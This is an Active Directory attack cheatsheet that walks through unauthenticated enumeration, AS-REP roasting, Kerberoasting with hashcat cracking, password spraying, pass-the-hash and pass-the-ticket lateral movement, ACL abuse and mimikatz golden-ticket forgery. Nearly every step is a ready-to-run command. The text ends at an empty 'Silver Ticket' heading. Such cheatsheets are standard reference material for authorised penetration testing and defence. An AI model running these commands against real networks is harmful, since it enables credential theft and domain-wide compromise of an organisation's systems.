ACTIVE DIRECTORY ATTACKS CHEATSHEET

OVERVIEW
Active Directory (AD) is Microsoft's directory service used in most enterprise networks.
Compromising AD means compromising the entire organization.
Key targets: Domain Controller (DC), Domain Admin (DA) accounts, service accounts.

KEY CONCEPTS
Domain = logical group of networked objects (users, computers, groups)
Domain Controller (DC) = server that manages authentication for the domain
Forest = collection of one or more domains sharing a schema
Trust = relationship allowing users from one domain to access another
LDAP = protocol used to query AD (port 389, LDAPS 636)
Kerberos = default authentication protocol in AD (port 88)
NTLM = older authentication, still used as fallback
SMB = file sharing protocol, heavily used in AD (port 445)
RPC = remote procedure calls (port 135)
WinRM = Windows remote management (port 5985/5986)

ENUMERATION WITHOUT CREDENTIALS

Network scan for DC:
nmap -p 88,135,389,445,636,3268,3269 192.168.1.0/24
Port 88 (Kerberos) = likely domain controller

SMB null session (anonymous):
smbclient -L //DC_IP -N
smbmap -H DC_IP
enum4linux -a DC_IP
enum4linux-ng -A DC_IP
crackmapexec smb DC_IP

LDAP anonymous bind:
ldapsearch -x -H ldap://DC_IP -b "dc=domain,dc=com"
ldapsearch -x -H ldap://DC_IP -b "dc=domain,dc=com" "(objectClass=user)"

AS-REP Roasting (no creds needed):
Find accounts with Kerberos pre-auth disabled:
GetNPUsers.py domain.com/ -dc-ip DC_IP -usersfile users.txt -no-pass -outputfile asrep_hashes.txt
Crack: hashcat -m 18200 asrep_hashes.txt rockyou.txt

KERBEROASTING
Find service accounts with SPNs, request TGS tickets, crack offline.
GetUserSPNs.py domain.com/user:password -dc-ip DC_IP -outputfile kerberoast.txt
Crack: hashcat -m 13100 kerberoast.txt rockyou.txt
Windows: Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty hash

PASSWORD ATTACKS

crackmapexec smb DC_IP -u users.txt -p "Password123" --continue-on-success

PASS THE HASH (PTH)
Use NTLM hash without cracking:
psexec.py -hashes :NTLM_HASH domain/user@target
wmiexec.py -hashes :NTLM_HASH domain/user@target
evil-winrm -i target -u user -H NTLM_HASH
crackmapexec smb target -u user -H NTLM_HASH

PASS THE TICKET (PTT)
Use Kerberos ticket (TGT/TGS):
mimikatz: sekurlsa::tickets /export
Impacket: getTGT.py domain.com/user:password -dc-ip DC_IP
Export ticket: export KRB5CCNAME=ticket.ccache
Use with tools: secretsdump.py -k -no-pass domain/user@DC_IP

PRIVILEGE ESCALATION IN AD

ACL/ACE Abuse:
Find interesting ACLs with BloodHound or PowerView
WriteDACL, GenericAll, GenericWrite, ForceChangePassword = exploitable permissions
PowerView: Add-DomainObjectAcl, Set-DomainUserPassword

Golden Ticket (forge TGT with krbtgt hash, unlimited access):
Get krbtgt hash via DCSync
mimikatz: kerberos::golden /user:Administrator /domain:domain.com /sid:DOMAIN_SID /krbtgt:HASH /ptt

Silver Ticket (forge TGS for specific service):
